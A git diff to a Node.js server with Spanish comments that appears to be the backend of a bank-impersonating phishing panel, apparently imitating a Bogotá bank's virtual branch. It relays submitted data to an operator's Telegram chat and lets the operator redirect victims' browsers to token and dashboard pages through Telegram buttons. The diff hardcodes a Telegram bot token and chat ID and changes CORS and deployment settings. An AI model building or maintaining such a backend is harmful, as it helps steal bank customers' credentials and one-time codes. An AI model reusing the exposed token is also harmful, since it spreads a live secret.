@@ -12,7 +12,7 @@ const PORT = process.env.PORT || 3000;
 // Determinar si estamos en Vercel
 const isVercel = process.env.VERCEL === '1';
 
-// Configuración de Socket.io
+// Configuración de Socket.io - DEBE ESTAR ANTES DE CUALQUIER RUTA
 const io = new Server(httpServer, {
     cors: { 
         origin: isVercel 
@@ -23,13 +23,39 @@ const io = new Server(httpServer, {
     }
 });
 
+// El resto de tu código continúa aquí...
+
 // Configuración de Telegram
 const token = process.env.TELEGRAM_TOKEN || '8582118363:AAEmFQDHohsvmLpLkUl9MHlv62IvPfxFAAY';
 const chatId = process.env.TELEGRAM_CHAT_ID || '7831097636';
 
-// Configurar bot según el entorno
+// Middlewares
+app.use(express.json());
+app.use(express.static(path.join(__dirname)));
+
+// Configurar CORS
+app.use((req, res, next) => {
+    const allowedOrigins = process.env.NODE_ENV === 'production' 
+        ? ['https://panel-de-bogota.vercel.app']
+        : ['http://localhost:3000', 'http://127.0.0.1:3000'];
+    
+    const origin = req.headers.origin;
+    if (allowedOrigins.includes(origin)) {
+        res.setHeader('Access-Control-Allow-Origin', origin);
+    }
+    
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+    next();
+});
+
+
+// Inicializar bot de Telegram
 let bot;
-if (isVercel) {
+
+if (process.env.NODE_ENV === 'production') {
+    // En producción usar webhook
     bot = new TelegramBot(token);
     
     // Configurar webhook para Vercel
@@ -38,38 +64,9 @@ if (isVercel) {
         res.sendStatus(200);
     });
 } else {
+    // En desarrollo usar polling
     bot = new TelegramBot(token, { polling: true });
 }
-
-// Middlewares
-app.use(express.json());
-app.use(express.static(path.join(__dirname)));
-
-// Configurar CORS
-app.use((req, res, next) => {
-    const origin = isVercel 
-        ? 'https://sucursbogotapersonas.vercel.app'
-        : 'http://localhost:3000';
-    
-    res.setHeader('Access-Control-Allow-Origin', origin);
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-    res.setHeader('Access-Control-Allow-Credentials', 'true');
-    next();
-});
-
-// Rutas para archivos HTML
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.get('/token.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'token.html'));
-});
-
-app.get('/dashboard.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard.html'));
-});
 
 // Función para enviar mensajes a Telegram
 async function sendTelegramMessage(data) {
@@ -153,13 +150,15 @@ bot.on('callback_query', async (callbackQuery) => {
         
         console.log(`🔄 Botón presionado: ${action}, Mensaje ID: ${messageId}`);
         
+        // Responder al callback
         await bot.answerCallbackQuery(callbackQuery.id, {
             text: `Procesando: ${action}`
         });
 
+        // Determinar redirección según la acción
         let redirectUrl, message;
-        const baseUrl = isVercel 
-            ? 'https://sucursbogotapersonas.vercel.app'
+        const baseUrl = process.env.NODE_ENV === 'production' 
+            ? 'https://panel-de-bogota.vercel.app'
             : 'http://localhost:3000';
         
         switch(action) {
@@ -183,6 +182,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 redirectUrl = `${baseUrl}/dashboard.html?action=finalizar`;
                 message = '✅ Proceso finalizado exitosamente';
                 
+                // Actualizar mensaje en Telegram solo para finalizar
                 await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                     chat_id: chatId,
                     message_id: messageId,
@@ -196,6 +196,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
         console.log(`📍 Redirigiendo a: ${redirectUrl}`);
         
+        // Emitir evento a todos los clientes conectados
         io.emit('telegram_action', {
             action: action,
             messageId: messageId,
@@ -217,8 +218,8 @@ io.on('connection', (socket) => {
     });
 });
 
-// Iniciar servidor solo en local
-if (!isVercel) {
+// Iniciar servidor solo si no estamos en Vercel (Vercel maneja el servidor automáticamente)
+if (process.env.NODE_ENV !== 'production') {
     httpServer.listen(PORT, () => {
         console.log(`🚀 Servidor ejecutándose en: http://localhost:${PORT}`);
         console.log(`🤖 Bot de Telegram iniciado en modo polling`);
@@ -227,7 +228,8 @@ if (!isVercel) {
 
 // Exportar para Vercel
 module.exports = (req, res) => {
-    if (isVercel && !global.botInitialized) {
+    // Configurar webhook en producción si es necesario
+    if (process.env.NODE_ENV === 'production' && !global.botInitialized) {
         const webhookUrl = `https://${req.headers.host}/api/webhook`;
         bot.setWebHook(webhookUrl).then(() => {
             console.log('✅ Webhook configurado para:', webhookUrl);
